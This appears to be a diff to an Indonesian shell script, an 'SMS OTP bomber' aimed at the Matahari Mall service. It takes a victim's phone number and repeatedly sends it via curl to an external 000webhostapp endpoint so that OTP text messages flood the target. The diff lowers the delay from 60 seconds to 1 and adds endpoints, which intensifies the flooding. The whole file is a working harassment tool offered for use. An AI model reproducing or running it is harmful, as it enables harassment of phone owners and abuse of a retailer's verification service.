@@ -16,14 +16,18 @@ yellow='\e[1;33m'
 #main 
 echo -e $blue"mBom Sms OTP Matahari Mall"
 echo -e $cyan"Coded by Handika Pratama - Reedit @sandro.putraa"
-echo -e $lightgreen">> input dgn 08xxx>>"
+echo -e $lightgreen">> input dgn 628xxx>>"
 echo -e $red""
 read -p "Input No HP: " anjg;
 echo ""  
 echo -e $yellow"Sedang mencoba Ngebom :)"
 echo -e $okegreen"Selama Ngga di Close bakal Ngebom terus :)"
+echo -e $okegreen""
+echo -e $cyan">>>> Hasil >>>>"
 if [ $anjg ]
 then
-curl "https://sandroewek.000webhostapp.com/mm/api.php?no=$anjg"
-sleep 60
+curl "https://sandroewek.000webhostapp.com/mm/r.php"
+
+curl "https://sandroewek.000webhostapp.com/mm/api1.php?no=$anjg"
+sleep 1
 fi 
